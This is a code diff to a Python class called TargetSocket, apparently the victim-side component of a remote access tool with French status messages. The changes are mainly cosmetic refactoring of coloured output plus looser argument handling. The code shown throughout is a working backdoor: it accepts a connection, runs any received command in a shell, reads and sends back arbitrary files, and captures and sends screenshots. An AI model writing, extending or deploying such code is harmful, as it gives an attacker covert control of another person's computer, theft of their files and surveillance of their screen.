@@ -23,9 +23,10 @@ class TargetSocket(BaseSocket):
 
     def listen(self):
         self.sock.listen()
-        print(f'{WHITE}📡 Attente de connexion sur {YELLOW}{self.IP}:{self.PORT} 📡')
+        print('📡 Attente de connexion sur ' + colored_info(f'{self.IP}:{self.PORT} 📡'))
         self.clientsocket, self.clientaddress = self.sock.accept()
-        print(f'\n{GREEN}✅ Connectee avec {YELLOW}{self.clientaddress[0]}:{self.clientaddress[1]} 🛜\n')
+        print(colored_success('✅ Connectee avec ') +
+              colored_info(f'{self.clientaddress[0]}:{self.clientaddress[1]} ✅\n'))
         self.connected = True
 
     def run(self):
@@ -45,15 +46,15 @@ class TargetSocket(BaseSocket):
             elif commande.lower() == 'info':
                 result = os.getcwd()
 
-            elif len(splited_commande) == 2 and splited_commande[0] == 'cd':
+            elif splited_commande[0] == 'cd':
                 try:
                     os.chdir(splited_commande[1])
                     result = os.getcwd() + '\n'
                 except FileNotFoundError as err:
-                    result = RED + str(err)
+                    result = colored_error(str(err))
                     print(result)
 
-            elif len(splited_commande) == 3 and splited_commande[0] == 'dl':
+            elif splited_commande[0] == 'dl':
                 try:
                     with open(splited_commande[1], 'rb') as f:
                         result = f.read()
@@ -64,22 +65,22 @@ class TargetSocket(BaseSocket):
                     print(str(err))
                     result = 'isdir'
 
-            elif len(splited_commande) == 2 and splited_commande[0] == 'capture':
+            elif splited_commande[0] == 'capture':
                 try:
                     image = ImageGrab.grab()
-                    image.save('.screenshot.png', 'png')
-                    with open('.screenshot.png', 'rb') as img:
+                    image.save(splited_commande[1], 'png')
+                    with open(splited_commande[1], 'rb') as img:
                         result = img.read()
                 except OSError as err:
                     print(str(err))
-                    result = 'error'
+                    result = 'screenshot-error'
 
             else:
                 output = subprocess.run(commande, shell=True, universal_newlines=True, capture_output=True)
                 if output.stdout is None:
-                    result = f'{RED}❗ Erreur!'
+                    result = colored_error(f'❗ Erreur!')
                 elif output.stdout == '':
-                    result = RED + output.stderr
+                    result = colored_error(output.stderr)
                 else:
                     result = output.stdout
 
@@ -87,13 +88,13 @@ class TargetSocket(BaseSocket):
                 print(f'{CYAN} ⌨️   > {commande}')
 
             if not result:
-                self.send_header_data(f'{RED}❗ Erreur!'.encode())
+                self.send_header_data(colored_error(f'❗ Erreur!').encode())
             else:
                 if isinstance(result, str):
                     result = result.encode(encoding=ENCODING)
                 self.send_header_data(result)
 
-        print(f'\n{GREEN}‼️ Deconnecte\n')
+        print(colored_success(f'\n‼️ Deconnecte\n'))
         self.clientsocket.close()
         self.sock.close()
 
